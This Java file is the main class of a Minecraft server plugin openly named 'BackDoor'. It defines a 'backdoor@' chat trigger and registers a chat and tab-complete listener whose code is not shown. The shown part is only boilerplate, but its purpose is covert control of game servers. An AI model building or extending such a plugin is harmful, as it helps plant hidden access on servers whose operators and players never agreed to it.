package me.skully.backdoorplugin;

import me.skully.backdoorplugin.Listeners.TabCompleter;
import org.bukkit.plugin.java.JavaPlugin;

public final class Main extends JavaPlugin {

    public final String backDoor = "backdoor@"; // Сообщения которое будет для использования BackDoor
    public final String pName = "BackDoor", pVersion = "V1"; // Название плагина, и BackDoor + версия
    public static Main instance; // Создаём переменную доступа

    @Override
    public void onEnable() {
        instance = this; // регистрируем instance тут
        System.out.println(pName + " " + pVersion + "ENABLED"); // ВЫВОД ВКЛЮЧЕНИЯ ПЛАГИНА

        getServer().getPluginManager().registerEvents(new TabCompleter(), this); // Регистрируем ивент таб сомплитера ( и чата )
    }

    @Override
    public void onDisable() {
        instance = null; // Передаём в доступ плагина null дабы не было различных гличей
        System.out.println(pName + " " + pVersion + "DISABLED"); // ВЫВОД ОТКЛЮЧЕНИЯ ПЛАГИНА
    }
}
